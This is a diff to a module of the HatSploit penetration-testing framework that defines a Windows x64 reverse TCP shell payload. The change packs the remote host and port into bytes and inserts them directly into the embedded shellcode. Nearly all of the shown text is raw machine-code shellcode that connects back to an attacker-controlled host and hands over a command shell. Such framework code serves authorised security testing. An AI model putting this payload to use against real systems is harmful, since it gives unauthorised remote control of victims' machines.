@@ -6,11 +6,11 @@
 #
 
 from hatsploit.lib.payload import Payload
+from pex.socket import Socket
 
 
-class HatSploitPayload(Payload):
+class HatSploitPayload(Payload, Socket):
     details = {
-        'Category': "stager",
         'Name': "Windows x64 Shell Reverse TCP",
         'Payload': "windows/x64/shell_reverse_tcp",
         'Authors': [
@@ -24,8 +24,8 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        remote_host = self.handler['RHOST']
-        remote_port = self.handler['RPORT']
+        remote_host = self.pack_host(self.handler['RHOST'])
+        remote_port = self.pack_port(self.handler['RPORT'])
 
         return (
             b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00"
@@ -53,8 +53,7 @@ class HatSploitPayload(Payload):
             b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73"
             b"\x32\x5f\x33\x32\x00\x00\x41\x56\x49"
             b"\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
-            b"\x49\x89\xe5\x49\xbc\x02\x00"
-            b":rport:port::rhost:ip:"
+            b"\x49\x89\xe5\x49\xbc\x02\x00" + remote_host + remote_port +
             b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41"
             b"\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89"
             b"\xea\x68\x01\x01\x00\x00\x59\x41\xba"
@@ -80,7 +79,4 @@ class HatSploitPayload(Payload):
             b"\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
             b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
             b"\x59\x41\x89\xda\xff\xd5"
-        ), {
-            'rhost': remote_host,
-            'rport': remote_port
-        }
+        )
